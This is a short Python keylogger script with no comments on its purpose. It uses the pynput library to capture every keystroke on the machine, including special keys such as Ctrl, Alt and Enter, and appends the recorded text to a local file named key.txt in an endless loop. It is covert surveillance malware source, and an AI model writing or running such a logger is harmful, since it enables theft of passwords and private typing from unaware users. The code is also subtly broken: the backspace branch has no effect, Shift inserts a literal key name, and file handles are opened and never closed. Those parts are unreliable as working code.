from pynput.keyboard import Listener,Key
import sys

msg=''
def on_press(key):
    global msg
    k=str(key).replace("'","")
    if key==Key.esc:
        msg+='<ESC>'
        # For testing 
        # sys.exit()
    elif key==Key.tab:
        msg+='    '
    elif (key==Key.ctrl)|(key==Key.ctrl_l)|(key==Key.ctrl):
        msg+='C-'
    elif key==Key.backspace:
        msg[:-1]
    elif (key==Key.alt)|(key==Key.alt_r)|(key==Key.alt_l)|(key==Key.alt_gr):
        msg+='<ALT>'
    elif (key==Key.down)|(key==Key.right)|(key==Key.left)|(key==Key.up):
        msg+="<Arrow>"
    elif (key==Key.shift)|(key==Key.shift_l)|(key==Key.shift_r):
        msg+=k.upper()
    elif key==Key.enter:
        msg+="\n"
    elif key==Key.space:
        msg+=" "
    else:
        msg+=k
        save()
def save():
    global msg
    file=open("./key.txt","a")
    if(len(msg)>=10):
        file.write(msg)
        msg=''

file = open("./key.txt","w+")
file.close()
while True:
    with Listener(on_press=on_press) as l:
        l.join()